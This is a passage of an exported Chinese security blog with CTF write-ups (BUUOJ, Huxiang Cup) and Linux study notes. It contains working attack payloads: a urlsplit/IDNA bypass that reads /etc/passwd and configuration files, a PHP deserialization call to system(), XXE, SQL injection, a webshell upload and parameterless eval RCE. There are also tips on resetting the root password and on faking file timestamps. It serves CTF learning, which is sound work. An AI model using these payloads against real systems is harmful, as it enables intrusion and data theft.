2019]Pythonginx考点:nginx文件、代码审计、urlsplit()函数漏洞\n\n\n\n\n\n\n\n\n\nNginx 重要文件目录\n\n配置文件存放目录：/etc/nginx\n主要配置文件：/etc/nginx/conf/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\n\n给出了一段代码：\n        \n        @app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n    &lt;/code>\n    &lt;!-- Dont worry about the suctf.cc. Go on! -->\n    &lt;!-- Do you know the nginx? -->\n\n这里需要绕过前面的俩个if语句，然后进入第三个if语句，并且通过传入的url读取文件。\n\n\n\n\n\n\n\n\n\nurlsplit()是 urllib.parse 模块下的一个函数，跟 urlparse 效果一样用来对 url 进行分割，但是有一点不一样的是 urlsplit 分割出来的没有 params 这个属性。\nCVE-2019-9636：urlsplit 不处理 NFKC 标准化\nhttps://bugs.python.org/issue36216\nCVE-2019-10160：urlsplit NFKD 标准化漏洞\nhttps://bugs.python.org/issue36742\n漏洞原理：\n用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。\n例如，在直接比较中，\\ uFF03不等于’＃’，而是统一化为’＃’，这会更改 URL 的片段部分。类似地，\\ u2100 统一化为’a/c’，它引入了路径段。\n所以我们需要找一个字符来替换suctf.cc中的一个c\nfrom urllib.parse import urlparse,urlunsplit,urlsplit\nfrom urllib import parse\ndef getUrl(url):\n    url = url\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return False\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return False\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return True\n    else:\n        return False\n\ndef get_unicode():\n    for i in range(65535):\n        uni=chr(i)\n        url=\"http://suctf.c&#123;0&#125;\".format(uni)\n        try:\n            if getUrl(url):\n                print(\"str: \"+uni+' unicode: \\\\u'+str(hex(i))[2:])\n        except:\n            pass\n\nif __name__ == \"__main__\":\n    get_unicode()\n\n\nstr: ℂ unicode: \\u2102\nstr: ℭ unicode: \\u212d\nstr: Ⅽ unicode: \\u216d\nstr: ⅽ unicode: \\u217d\nstr: Ⓒ unicode: \\u24b8\nstr: ⓒ unicode: \\u24d2\nstr: Ｃ unicode: \\uff23\nstr: ｃ unicode: \\uff43\n\n这些都是可以用来成功替代其中的一个c的字符。\n例如：\nhttp:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\n\netc/nginx/conf/nginx.conf并不存在\nhttp:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf\n\n内容:\nserver &#123; listen 80; location &#x2F; &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock; &#125; location &#x2F;static &#123; alias &#x2F;app&#x2F;static; &#125; # location &#x2F;flag &#123; # alias &#x2F;usr&#x2F;fffffflag; # &#125; &#125;\n\n发现了usr/fffffflag\nhttp:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag\n\n\n修改一下脚本就可以看到，在三次if语句执行前，host分别是什么值\nsuctf.cⅽ\nsuctf.cⅭ\nsuctf.cc\nhttp:&#x2F;&#x2F;suctf.cⅭ\n\n[网鼎杯 2020 朱雀组]phpweb考点：代码审计、反序列化\n&lt;b&gt;Warning&lt;&#x2F;b&gt;:  date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;24&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;\n2020-11-15 09:01:52 am&lt;&#x2F;p&gt;\n\n抓包可以发现，post了参数一个是函数名，一个是函数参数,所以直接用file_get_contents()函数来获取源码\n&lt;?php\n $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n function gettime($func, $p) &#123;\n     $result = call_user_func($func, $p);\n     $a= gettype($result);\n     if ($a == \"string\") &#123;\n         return $result;\n     &#125; else &#123;return \"\";&#125;\n &#125;\n class Test &#123;\n     var $p = \"Y-m-d h:i:s a\";\n     var $func = \"date\";\n     function __destruct() &#123;\n         if ($this->func != \"\") &#123;\n             echo gettime($this->func, $this->p);\n         &#125;\n     &#125;\n &#125;\n $func = $_REQUEST[\"func\"];\n $p = $_REQUEST[\"p\"];\n\n if ($func != null) &#123;\n     $func = strtolower($func);\n     if (!in_array($func,$disable_fun)) &#123;\n         echo gettime($func, $p);\n     &#125;else &#123;\n         die(\"Hacker...\");\n     &#125;\n &#125;\n ?>\n\n这里首先，它过滤了大量的函数，所以很多函数都用不了了，并且他会对函数执行结果进行判断，只有是字符才能输出，所以一开始用scandir()去读目录是没有回复显示的。还有一个重要的点就是它其实是存在一个Test类，而这个Test类是会调用gettime函数的。而在diasble_func里也没有反序列化函数，所以我们可以利用反序列化来做这题。因为他只会吧func的内容和disable_func去做对比。\n&lt;?php\nclass Test &#123;\n    var $p = 'cat+/tmp/flagoefiu4r93';\n    var $func = \"system\";\n    function __destruct() &#123;\n        if ($this->func != \"\") &#123;\n            echo gettime($this->func, $this->p);\n        &#125;\n    &#125;\n&#125;\n\n$a = new Test();\n$b = serialize($a);\nvar_dump($b);\n?>\n\nweb根目录下并没有flag相关文件，合理利用Linux命令find来查找\nfunc&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:27:&quot;find+&#x2F;+-name+&quot;flag*&quot;+-print&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;\n\n\n发现在tmp里面\nfunc&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat+&#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;\n\n\n[NCTF2019]Fake XML cookbook考点：xxe\n提交账号密码，发现在username处存在xxe利用点。\n所以直接做xxe，来读取文件，然后刚好在flag处就有了。\n\n记录一个：读php文件的payload,PHP格式为&lt;?php ?&gt;类似xml格式，导致php被当作xml解析而难以读取其内容，可以使用PHP伪协议来读取文件内容。\n&lt;!DOCTYPE message [\n    &lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;doLogin.php&quot;&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;password&gt;66666&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;\n\n","slug":"BUUOJ刷题2020119-15","date":"2020-11-09T09:20:59.000Z","categories_index":"CTF","tags_index":"WEB,BUUOJ","author_index":"A1andNS"},{"id":"8b3531144a5c5026a6d6f350f14fc7b9","title":"RedHat学习(二)","content":"今天继续redhat系列\n输入输出重定向输入重定向：把文件导入导命令中来\n输出重定向：把输出写入到指定文件\n如果是先要结合linux命令来使用，一般是输出重定向起到更多作用。而输出重定向可以分为两种，标准输出重定向和错误输出重定向。而输入重定向，就是标准输入重定向。也就是STDIN(文件描述符0)、STDOUT(文件描述符1)、STDERR(文件描述符2)\n下面看输入重定向用到的符号和作用\n\n\n\n符号\n作用\n\n\n\n命令 &lt; 文件\n将文件作为命令的标准输入\n\n\n命令 &lt;&lt; 分界符\n从标准输入中读入，直到遇见分界符才停止\n\n\n命令 &lt; 文件1 &gt;文件2\n将文件1作为命令的标准输入并将标准输出到文件2\n\n\n输出重定向用到的符号作用\n\n\n\n符号\n作用\n\n\n\n命令 &gt; 文件\n将标准输出重定向到一个文件中，清空原文件数据\n\n\n命令 2&gt;&gt;文件\n将标准错误重定向到一个文件中，清空源文件数据\n\n\n命令 &gt;&gt; 文件\n将标准输出重定向到一个文件中，追加到原有内容的后面\n\n\n命令 2&gt;&gt; 文件\n将标错误出重定向到一个文件中，追加到原有内容的后面\n\n\n命令 &gt;&gt; 文件 2&gt;&amp;1\n将标准输出和错误输出共同写入到文件中，追加到原有内容的后面\n\n\n命令 &amp;&gt;&gt;文件\n将标准输出和错误输出共同写入到文件中，追加到原有内容的后面\n\n\n试一下：\n[a1andns@linuxprobe Desktop]$ echo \"Welcome to China\" > readme.txt \n[a1andns@linuxprobe Desktop]$ cat readme.txt \nWelcome to China\n[a1andns@linuxprobe Desktop]$ echo \"My name is A1andNS\" >> readme.txt \n[a1andns@linuxprobe Desktop]$ cat readme.txt \nWelcome to China\nMy name is A1andNS\n[a1andns@linuxprobe Desktop]$ echo \"clear all\" > readme.txt\n[a1andns@linuxprobe Desktop]$ cat readme.txt \nclear all\n\n这就是覆盖不覆盖的最好体现了，&gt;&gt;是追加，&gt;则是覆盖\n[a1andns@linuxprobe Desktop]$ ls -l aaa > cout.txt\nls: cannot access aaa: No such file or directory\n[a1andns@linuxprobe Desktop]$ ls -l aaa bbb > cout.txt\nls: cannot access aaa: No such file or directory\nls: cannot access bbb: No such file or directory\n[a1andns@linuxprobe Desktop]$ ls -l aaa readme.txt 2> cout.txt\n-rw-rw-r--. 1 a1andns a1andns 10 Nov  8 18:13 readme.txt\n[a1andns@linuxprobe Desktop]$ \n\n这里可以看到如果命令执行成功就会输出到cout.txt里面，但是在使用&gt;的时候，如果出现报错是无法写入的，所以这样就可以来让正确执行的输出到终端，而错误写入指定的错误日志里。\n管道命令符一个经常用到的管道符是|，它的用处是把左边的命令的输出作为后面一个命令的标准输入。\ngrep \"/etc/passwd\" /etc/passwd | wc -l\nls -l /etc/ | more\n\n所以你就可以利用管道符来重置密码，只需要一条命令\necho \"thisisthenewpassword\" | passwd --stdin root\n\n有了管道符很多操作就会变得方便起来，例如统计行数的操作，之前做溯源分析的时候就派上用场。\n命令行的通配符通配符是在很多时候都可以起到作用，例如想要批量操作以某些关键词开头的文件就可以用到了。有了这个东西，批量操作效率得到提升。这里的通配符有两种，分别是*和?，*代表匹配零个或多个字符，?代表匹配单个字符。\nls -l /dev/sda*\nls -l /dev/sda?\nls -l /dev/sda[0-9]\nla -l /dev/sda[156]\n\n转义字符四个最常用的转义字符为\\,&#39;&#39;,&quot;&quot;,&#39;\n\\让反斜杠后面的一个变量变成单纯的字符串。\n[a1andns@linuxprobe Desktop]$ echo \"this is \\$SHELL\"\nthis is $SHELL\n[a1andns@linuxprobe Desktop]$ echo \"this is $SHELL\"\nthis is /bin/bash\n[a1andns@linuxprobe Desktop]$ echo \"this is \\$$SHELL\"\nthis is $/bin/bash\n[a1andns@linuxprobe Desktop]$ \n\n如上尝试就可以发现\\的转义功能了。\n&#39;&#39;转义其中所有的变量为单纯的字符串，也就是说’’中的内容就只是字符串。\n[a1andns@linuxprobe Desktop]$ echo 'this is $SHELL'\nthis is $SHELL\n\n&quot;&quot;会保留其中所有的变量，不会对它们进行转义操作。\n这个看之前演示\\转义功能的就可以看出来了。\n``反引号，他是把其中命令执行后返回结果。\n#例如再一些文件名被ban了，无法使用，就可以利用到这个转义字符了\ncat `ls`    #这就是把ls命令执行的结果传递给cat\n[a1andns@linuxprobe etc]$ more `ls`\n\n\n环境变量变量时计算机系统用于保存可变值的数据类型的，再linux系统中，变量名称一般都是大写的。\n命令别名\n我们可以利用一个命令来创建命令别名\nalias ls='ls -l'\n#这样的话执行ls操作就会执行ls -l操作了。\nunalias ls\n#这样会移除别名\n#这个再有些时候你需要为常用命令添加一个更加方便的快捷方式就用上了。看你的需求的。\n\ntype ls\n#这个命令可以帮助你查看命令是内部命令还是外部命令\n\n#添加PATH变量\n[a1andns@linuxprobe Desktop]$ echo $PATH\n/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin\n[a1andns@linuxprobe Desktop]$ PATH=$PATH:/root/bin\n[a1andns@linuxprobe Desktop]$ echo $PATH\n/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/root/bin\n[a1andns@linuxprobe Desktop]$ \n\n这里要注意一点，添加PATH变量要合适，不应该随便乱添加，不然可能出现的问题是，黑客再某些公共目录下放置一些常用命令同名的恶意文件，而你不知道就直接使用，这就会产生风险。所以再接手一台Linux系统后先检查一下PATH变量中时候又可疑目录吧，以免吃亏了。\n如果想要查看所有的环境变量可以使用env命令来实现。\n下面来看看比较重要的一些环境变量\n\n\n\n变量名称\n作用\n\n\n\nHOME\n用户的主目录\n\n\nSHELL\n用户在使用的Shell解释器名称\n\n\nHISTSIZE\n输出的历史命令记录条数\n\n\nHISTFILESIZE\n保存的历史命令记录条数\n\n\nMAIL\n邮件保存路径\n\n\nLANG\n系统语言、语系名称\n\n\nRANDOM\n生成一个随机数字\n\n\nPSI\nBash解释器的提示符\n\n\nPATH\n定义解释器搜索用户执行命令的路径\n\n\nEDITOR\n用户默认的文本编辑器\n\n\n[a1andns@linuxprobe Desktop]$ echo $HOME\n/home/a1andns\n[a1andns@linuxprobe Desktop]$ echo $SHELL\n/bin/bash\n[a1andns@linuxprobe Desktop]$ su root\n[root@linuxprobe Desktop]# echo $HOME\n/root\n[root@linuxprobe Desktop]# echo $SHELL\n/bin/bash\n\n这里就试了一下，Linux是一个多用户、多任务的系统，所以可以为不同的用户提供独立的工作环境，因此使用不同的用户登录，你所对应的环境变量也是不同的。\n关于环境变量，我们也是可以去添加的，例如\n[root@linuxprobe Desktop]# CTF=/home/ctf\n[root@linuxprobe Desktop]# echo $CTF\n/home/ctf\n[root@linuxprobe Desktop]# cd $CTF\n[root@linuxprobe ctf]# \n\n大写来表示环境变量是一个约定熟成的习惯，大家也都是这么干了，所以也这样写。但是需要注意的是这里创建的变量是有作用域的，前面也说过了，linux是一个多用户系统，所以这个环境变量实际上是只适用与当前这个用户的。所以也就是具有局限性。而解决局限性，实现全局化，就可以利用到一个命令export。\n[a1andns@linuxprobe ~]$ CTF=/home/ctf\n[a1andns@linuxprobe ~]$ cd $CTF\n[a1andns@linuxprobe ctf]$ pwd\n/home/ctf\n[a1andns@linuxprobe ctf]$ export CTF\n[a1andns@linuxprobe ctf]$ su root\n[root@linuxprobe ~]# echo $CTF\n/home/ctf\n[root@linuxprobe ~]# cd $CTF\n[root@linuxprobe ctf]# pwd\n/home/ctf\n\n参考文献《Linux就该这么学》\n","slug":"RedHat学习-二","date":"2020-11-07T11:40:07.000Z","categories_index":"Linux学习","tags_index":"Linux,Redhat","author_index":"A1andNS"},{"id":"2c508b1aaa924e3c32b98fccd65763ca","title":"湖湘杯2020WP","content":"0x00 题目名字不重要反正题挺简单的给出了源码：\n&lt;?php\nerror_reporting(0);\n\n//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.\nif ( isset($_GET['file']) ) &#123;\n    $file = $_GET['file'];\n    \n    if ( $file === \"phpinfo\" ) &#123;\n        phpinfo();\n        exit;\n    &#125;\n\n    if ( preg_match('/proc/i' , $file) ) &#123;\n        die(\"private\");\n    &#125;\n\n    $file = \"/var/www/html/\" . $file;\n    $content = file_get_contents($file);\n\n    if ( !$content ) &#123;\n        die(\"nothing\");\n    &#125;\n\n    if ( preg_match(\"/script|&lt;\\?/i\", $content) ) &#123;\n        die(\"bypass me\");\n    &#125;\n\n    include_once $file;\n\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n根据源码试着去访问一下phpinfo，?file=phpinfo，使用网页搜索，搜了一下DASCTF，居然直接在环境变量里找到了flag，应该是非预期了。\n\n0x01 NewWebsite这一题在cid参数处存在sql注入点。\n?r=content&amp;cid=1 or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 6,1)));\n\n可以找到一个manage表\n?r=content&amp;cid=1 or extractvalue(0x0a,concat(0x0a,(select `4` from (select 1,2,3,4,5,6,7,8 union select * from manage)a limit 1,1)));\n\n获取到admin账号和密码，admin/admin\n然后在/admin页面进行管理员后台登录，登录后查看网页源码，可以发现一个?r=manageinfo的点，访问一下/admin/?r=manageinfo可以发现有一个文件上传的模块。\n经过测试可以使用phtml后缀来上传php文件。\n\n然后直接使用antsword连接这个webshell。\n\n","slug":"湖湘杯2020WP","date":"2020-11-06T08:55:49.000Z","categories_index":"CTF","tags_index":"WEB,湖湘杯","author_index":"A1andNS"},{"id":"d5ddaa5391254c799899399e917138e4","title":"RedHat学习(一)","content":"这个是redhat系统学习系列文章，为了提升对linux系统的了解和熟悉程度，提高运维能力。\nroot用户突然忘记，又急需使用的时候就可以使用这个手法，但是如果你自习一想，如果你根本就不知道密码，又想要登录root账户，这种手法就有点意思了，仿佛提权。\n紧急救援模式恢复密码在启动引导界面，输入e，进入内核编辑模式\n   \n然后在linux16后面添加上一句rd.break,使用ctrl+x来执行内核.\n\n然后就会进入到紧急求援模式,这个时候就可以通过命令来修改root用户的密码了.\n\nmount -o remount,rw /sysroot\nchroot /sysroot\npasswd\ntouch /.autorelabel\nexit\nreboot\n\n\nlinux常用命令我这里学的是RHEL 7 ，在这个版本的系统中，初始化程序改为使用systemd进程来代替原来的System V init，所以在一些服务操作的命令上就发生了变化\n例如：\nservice httpd start ============>  systemctl start httpd.service\nchkconfig httpd on  ============>  systemctl enable httpd.service   \n\n相应的运行级别也被systemd的目标名称替换，具体可以百度，查询一下。\n查看帮助命令man\n\n常用系统命令echo    #用于在终端输出字符串或变量提取后的值\necho $SHELL\necho a1andns\n\ndate    #用于显示及设置系统的时间或日期\ndate -s \"20201106 19:01:00\"\t   #修改时间\n#格式化输出%t跳格，%H小时，%I小时，%M分钟，%S秒，%j今年的第几天，%m月，%d日，%Y年\n\nreboot    #重启\npoweroff    #关机\nwget    #用于下载网络文件\nwget http://www.example.com/docs/132.pdf\n\nps    #查看进程状态\nps -aux\n\ntop    #动态监控进程活动和系统负载\npidof    #查询某个程序对应的PID\npidof sshd\n\nkill    #用于终止指定的某个PID进程\nkill 2156\n\nkillall    #用于终止某个指定名称的服务所对应的全部进程\n\n如果需要后台运行某个命令，可以在命令的结尾加上一个&amp;符号就好了。\n\n系统状态检测命令ifconfig    #查询网卡配置和网络状况，这个之前在一些debian类型的系统中可能会没有，所以使用命令安装apt install net-tools\n\nuname    #用于查看系统内核与系统版本等信息\nuname -a\n\nuptime    #用于查看系统的负载信息\n\nfree    #查看当前系统中内存的使用量信息\nfree -h\n\nwho    #用于查看当前登入主机的用户终端信息\n\nlast    #查看系统所有的登录记录\n\nhistory    #显示历史执行过的命令\n\nsocreport    #收集系统配合以及架构信息并且输出诊断文档。\n\n目录切换命令pwd    #查看当前用户所处的工作目录\n\ncd    #切换到指定目录\ncd /var    #进入/var目录\ncd ..    #返回上一级目录\ncd -    #返回上一次目录\n\nls    #显示目录中的信息\nls -a   #查看所有\nls -l   #查看目录中的信息+属性大小等信息\nls -ld    #查看目录属性信息\n\n文本编辑命令cat    #查看文本内容，适合短文本，因为长文本的话，后面的信息会把前面的信息覆盖了。\ncat -n #带行数的查看\n\nmore   #查看文本内容，适合查看长文本，可以翻页阅读\n\nhead    #查看文本文件最前N行内容\nhead -n 15 1.txt\n\ntail    #查看文本文件最后N行内容\ntail -n 15 1.txt\n\ntr    #用于替换文本文件中的字符,一般要配合管道符使用\n\ncat 1.txt | tr [a-z] [A-Z]\n\nwc    #用于统计指定文本的行数、字数、字节数\nwc -l 1.txt #统计文本行数\nwc -w 1.txt #统计文本单词数\nwc -c 1.txt #统计字节数\n\nstat    #查看文件的具体存储信息和时间等信息\nstat /etc/passwd\n\ncut    #按列提取文本字符\ncut -d: -f1 /etc/passwd #提取以:符号为间隔符号的第一列的内容\n\ndiff    #比较多个文本文件的差异\ndiff --brief    #显示比较后的结果\ndiff -c    #查看文件内容具体的不同。\n\n在做溯源分析和平时cat被过滤禁用，是就有了其他选择例如head、tail以及more。之前的信息安全铁人三项赛中wc就立了大功。\n文件目录管理命令touch    #创建空白文件或设置文件时间\ntouch -a   #仅修改读取时间\ntouch -m   #仅修改修改时间\ntouch -d   #同时修改atime与mtime\n#这个对于hack来说很有用，可以在修改文件后，把文件的修改时间重新设置回去。\n\nmkdir    #创建空白的目录\nmkdir a1andns\nmkdir -p a1andns/a1andns2    #递归创建具有嵌套叠层关系的文件目录\n\ncp    #复制文件或目录\ncp 1.txt 2.txt   #复制1.txt为2.txt\n\nmv    #剪切文件或将文件重命名\nmv 1.txt 2.txt       #文件1.txt改名为2.txt\n\nrm    #用于删除文件或目录\nrm -f 1.txt\nrm -r a1andns\n\ndd    #按照指定的大小和个数的数据块来复制文件或转换文件\ndd if=/dev/zero of=a1andns count=1 bs=660M    #生成一个文件a1andns大小是660M\ndd if=/dev/cdrom of=RHEL-server-7.0-x86_64.iso\n\nfile    #用于查看文件类型\nfile 1.txt\n\n打包压缩与搜索命令tar   #对文件进行打包压缩或解压\ntar -xzvf test.tar.gz    #解压\ntar -czvf test.tar.gz    #压缩\ntar -xjvf test.tar.bz2   #解压\ntar -cjvf test.tar.bz2   #压缩\n\ngrep    #在文本中执行关键词搜索，并且显示匹配结果\ngrep /sbin/nologin /etc/passwd  #去etc/passwd中搜索/sbin/nologin\n\nfind    #按照指定条件来查找文件\nfind / -name \"flag*\" -print\nfind / -perm -4000 -print\nfind / -user a1andns -a &#123;&#125; /root/findresult/ \\;\n\n参考文献《Linux就该这么学》\n","slug":"RedHat学习-一","date":"2020-11-04T13:25:26.000Z","categories_index":"Linux学习","tags_index":"Linux,Redhat","author_index":"A1andNS"},{"id":"452153053cb456e93e9f321b6100ce19","title":"无参数函数RCE","content":"最近做题遇到了无参数函数来RCE的题，这里记录一下一些想法，以备后来查证。\n这种题目的做法基本上就是，利用超级全局变量来进行bypass，利用函数的嵌套的替代参数的出现。然后进行任意文件读取。\n无参数函数通常来说如果在PHP中有一个语句\neval($_POST['cmd']);\n\n我们就可以利用cmd这个参数来getshell。\n但是很可惜的是cmd这个参数被做了过滤。\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['cmd'])) &#123;    \n    eval($_GET['cmd']);\n&#125;\n\n变成了这样后，如果我们使用参数就会出现问题，正则校验是无法通过的。这里可以去看一下[GXYCTF2019]禁止套娃，BUUOJ上有环境。\n/[^\\W]+\\((?R)?\\)/\n\n如果输入的是system(‘ls’)这样的有参数函数，正则匹配就会匹配不到，从而没有替换为空，那么===’;’的条件就无法满足。\n只有a();、a(b(c()));这样的格式才能够被匹配。\n\n上面这个正则就是明显的过滤参数，只允许无参数函数的表现。\n超级全局变量我们可以通过查阅PHP手册，找到很多超级全局变量。\n\n\n\n\n\n\n\n\n\nPHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。\nPHP 超级全局变量列表:\n\n$GLOBALS\n\n$_SERVER\n\n$_REQUEST\n\n$_POST\n\n$_GET\n\n$_FILES\n\n$_ENV\n\n$_COOKIE\n\n$_SESSION\n\n详细可以查看https://www.php.cn/php/php-superglobals.html\n这里面有个有趣的超级全局变量$_ENV\n\n\n\n\n\n\n\n\n\n$_ENV数组中的内容是在php解析器运行时，从php所在服务器中的环境变量转变为php全局变量的,可以认为它就是一个环境变量的集合\n这里有一个和$_ENV有关的一个函数getenv(),官方手册对它的介绍是\nhttps://www.php.net/manual/en/function.getenv.php\ngetenv()getenv(name)所以我们可以利用这个函数获取一个名为name环境变量的值。 \n\narray_rand()这个会经常用到，作用是从数组中随机取出一个或多个单元。\nhttps://www.php.net/manual/en/function.array-rand.php\n&lt;?php\n$a = array('a', \"v\", 's', 'b', 't');\nvar_dump(array_rand($a));\n?>\n    \n结果：int(3)\n\n这样就可以取出一个单元，但是这里返回的是键，而不是值。如果想要得到值，就可以用一个函数先处理一下。这就是下面要说的这个函数了。\narray_flip()这个函数的作用是交换数组中的键和值，这样原来的键就变成值了，而原来的值就变成键了。\nhttps://www.php.net/manual/zh/function.array-flip.php··\n&lt;?php\n$a = array('a', \"v\", 's', 'b', 't');\nfor ($i=1; $i&lt;10; $i++)&#123;\n    var_dump(array_rand(array_flip($a)));\n&#125;\n?>\n    \n结果：\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"b\"\nstring(1) \"a\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"t\"\n\nlocaleconv()这个函数也会经常被用到，因为这个函数会返回一些字符组成的数组，通过使用localeconv()和current()等数组操作函数结合，就可以做到读出某个字符。\n&lt;?php echo current(localeconv());?>\n    \n结果：string(1) \".\"\n\n经常被用来替代点符号.\ngetallheaders()getenv()函数是用来获取环境变量的，而这个getallheaders则是用来获取http header的\nhttps://www.php.net/manual/zh/function.getallheaders.php\n&lt;?php\nvar_dump(getallheaders());\n?&gt;\n\n\n结果：\narray(13) &#123;\n  [&quot;Content-Length&quot;]&#x3D;&gt;\n  string(1) &quot;0&quot;\n  [&quot;Cookie&quot;]&#x3D;&gt;\n  string(85) &quot;_ga&#x3D;GA1.1.125883784.1603376093; Phpstorm-b0ddb94&#x3D;486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;\n  [&quot;Accept-Language&quot;]&#x3D;&gt;\n  string(47) &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6&quot;\n  [&quot;Accept-Encoding&quot;]&#x3D;&gt;\n  string(17) &quot;gzip, deflate, br&quot;\n  [&quot;Sec-Fetch-Dest&quot;]&#x3D;&gt;\n  string(8) &quot;document&quot;\n  [&quot;Sec-Fetch-User&quot;]&#x3D;&gt;\n  string(2) &quot;?1&quot;\n  [&quot;Sec-Fetch-Mode&quot;]&#x3D;&gt;\n  string(8) &quot;navigate&quot;\n  [&quot;Sec-Fetch-Site&quot;]&#x3D;&gt;\n  string(4) &quot;none&quot;\n  [&quot;Accept&quot;]&#x3D;&gt;\n  string(124) &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;\n  [&quot;User-Agent&quot;]&#x3D;&gt;\n  string(131) &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36 Edg&#x2F;86.0.622.51&quot;\n  [&quot;Upgrade-Insecure-Requests&quot;]&#x3D;&gt;\n  string(1) &quot;1&quot;\n  [&quot;Host&quot;]&#x3D;&gt;\n  string(15) &quot;localhost:63342&quot;\n  [&quot;Content-Type&quot;]&#x3D;&gt;\n  string(0) &quot;&quot;\n&#125;\n\n\n这里如果我在http头部写入一些恶意函数会如何呢？\n&lt;?php\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['cmd'])) &#123;\n    eval($_GET['cmd']);\n&#125;\n?>\n\n我这里添加一个头信息，然后可以看到果然出现了phpinfo()\n\n更近一步，加上current()\nstring(10) 